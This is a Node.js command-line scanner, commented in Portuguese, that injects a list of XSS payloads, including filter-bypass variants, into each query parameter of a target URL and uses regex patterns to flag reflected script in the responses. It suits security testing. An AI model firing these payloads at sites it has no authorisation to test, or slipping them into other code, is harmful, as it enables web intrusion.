#!/usr/bin/env node
/**
 * XSS Scanner Automation
 * Scanner para detecção de vulnerabilidades Cross-Site Scripting.
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

// Payloads XSS
const PAYLOADS = {
  basic: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
  ],
  advanced: [
    '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">',
  ],
  bypass: [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '<script>alert(String["fromCharCode"](88,83,83))</script>',
    '<img src=x onerror=alert`1`>',
  ],
  dom: [
    '#<script>alert(1)</script>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
  ]
};

// Padrões para detectar XSS na resposta
const XSS_PATTERNS = [
  /<script[^>]*>.*?alert\s*\(/i,
  /onerror\s*=\s*["']?alert/i,
  /onload\s*=\s*["']?alert/i,
  /onclick\s*=\s*["']?alert/i,
  /<img[^>]+onerror/i,
  /<svg[^>]+onload/i,
];

class XSSScanner {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.results = [];
  }

  async makeRequest(url) {
    return new Promise((resolve, reject) => {
      const parsedUrl = new URL(url);
      const client = parsedUrl.protocol === 'https:' ? https : http;
      
      const req = client.get(url, { timeout: this.timeout }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ status: res.statusCode, body: data }));
      });
      
      req.on('error', reject);
      req.on('timeout', () => reject(new Error('Timeout')));
    });
  }

  injectPayload(url, param, payload) {
    const parsedUrl = new URL(url);
    parsedUrl.searchParams.set(param, payload);
    return parsedUrl.toString();
  }

  checkXSSInResponse(content, payload) {
    // Verifica se o payload aparece na resposta
    if (content.includes(payload)) {
      return { found: true, type: 'reflected', evidence: 'Payload found in response' };
    }
    
    // Verifica padrões XSS
    for (const pattern of XSS_PATTERNS) {
      if (pattern.test(content)) {
        return { found: true, type: 'pattern_match', evidence: pattern.toString() };
      }
    }
    
    return { found: false };
  }

  async testParameter(url, param) {
    console.log(`\n🔍 Testing parameter: ${param}`);
    const results = [];
    
    const allPayloads = [
      ...PAYLOADS.basic,
      ...PAYLOADS.advanced,
      ...PAYLOADS.bypass
    ];
    
    for (const payload of allPayloads) {
      try {
        const testUrl = this.injectPayload(url, param, payload);
        const response = await this.makeRequest(testUrl);
        
        const check = this.checkXSSInResponse(response.body, payload);
        
        if (check.found) {
          const result = {
            url,
            parameter: param,
            payload,
            type: check.type,
            evidence: check.evidence,
            confidence: 'High'
          };
          results.push(result);
          console.log(`  ⚠️  XSS found! Payload: ${payload.substring(0, 30)}...`);
        }
      } catch (error) {
        // Ignore request errors
      }
    }
    
    return results;
  }

  async scan(url) {
    console.log(`\n🛡️ XSS Scanner - Target: ${url}`);
    console.log('='.repeat(50));
    
    const parsedUrl = new URL(url);
    const params = Array.from(parsedUrl.searchParams.keys());
    
    if (params.length === 0) {
      console.log('⚠️  No parameters found in URL');
      return [];
    }
    
    console.log(`\n📋 Parameters found: ${params.join(', ')}`);
    
    for (const param of params) {
      const paramResults = await this.testParameter(url, param);
      this.results.push(...paramResults);
    }
    
    return this.results;
  }

  printResults() {
    console.log('\n' + '='.repeat(50));
    console.log('📊 SCAN RESULTS');
    console.log('='.repeat(50));
    
    if (this.results.length === 0) {
      console.log('\n✅ No XSS vulnerabilities found!');
      return;
    }
    
    console.log(`\n⚠️  Found ${this.results.length} potential XSS vulnerabilities:\n`);
    
    this.results.forEach((result, index) => {
      console.log(`${index + 1}. Parameter: ${result.parameter}`);
      console.log(`   Type: ${result.type}`);
      console.log(`   Payload: ${result.payload.substring(0, 50)}...`);
      console.log(`   Confidence: ${result.confidence}`);
      console.log('');
    });
  }
}

// CLI
const args = process.argv.slice(2);
let targetUrl = null;

for (let i = 0; i < args.length; i++) {
  if (args[i] === '--url' || args[i] === '-u') {
    targetUrl = args[i + 1];
  }
}

if (!targetUrl) {
  console.log('Usage: node xss_scanner.js --url <target_url>');
  console.log('Example: node xss_scanner.js --url "https://example.com/search?q=test"');
  process.exit(1);
}

const scanner = new XSSScanner();
scanner.scan(targetUrl).then(() => {
  scanner.printResults();
  process.exit(scanner.results.length > 0 ? 1 : 0);
}).catch(error => {
  console.error('Error:', error.message);
  process.exit(1);
});
